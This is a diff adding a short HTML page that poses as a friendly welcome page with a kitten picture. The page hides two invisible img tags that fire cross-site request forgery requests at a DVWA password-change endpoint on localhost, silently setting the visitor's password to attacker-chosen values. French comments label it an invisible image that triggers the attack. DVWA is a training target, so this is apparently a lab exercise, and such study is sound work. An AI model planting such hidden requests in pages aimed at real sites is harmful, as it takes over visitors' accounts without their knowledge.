@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h1>Welcome to our website!</h1>
+<p>Enjoy this beautiful image:</p>
+
+<!-- Image invisible qui déclenche l'attaque CSRF -->
+<img src="http://localhost/dvwa/vulnerabilities/csrf/?password_new=IMG_HACK_123&password_conf=IMG_HACK_123&Change=Change" 
+     width="0" height="0" alt="">
+
+<!-- Version avec image réelle + invisible -->
+<img src="http://localhost/dvwa/vulnerabilities/csrf/?password_new=SECRET_PWN&password_conf=SECRET_PWN&Change=Change"
+     style="display:none">
+
+<p>More content below...</p>
+<img src="https://placekitten.com/200/200" alt="Cute kitten">
+</body>
+</html>
